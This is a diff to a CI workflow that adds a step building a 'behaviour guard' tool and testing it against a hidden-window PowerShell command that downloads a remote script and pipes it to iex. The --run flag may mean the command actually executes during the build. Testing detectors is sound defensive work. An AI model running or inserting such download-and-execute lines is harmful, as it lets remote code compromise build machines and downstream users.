@@ -60,6 +60,15 @@ jobs:
           & vendor/ibra-ext-installer.exe --list
           "helper exit: $LASTEXITCODE"
 
+      - name: Build behaviour guard (.NET Framework 4.8)
+        shell: pwsh
+        run: |
+          dotnet build tools/guard/Guard.csproj -c Release -o tmp/guard
+          if ($LASTEXITCODE -ne 0) { throw "guard build failed" }
+          Copy-Item tmp/guard/ibra-guard.exe vendor/ -Force
+          if (Test-Path tmp/guard/ibra-guard.exe.config) { Copy-Item tmp/guard/ibra-guard.exe.config vendor/ -Force }
+          & vendor/ibra-guard.exe --judge 'powershell -w hidden -c "iwr https://x.top/a | iex"' --run
+
       - name: Remove debug files and show bundle size
         shell: pwsh
         run: |
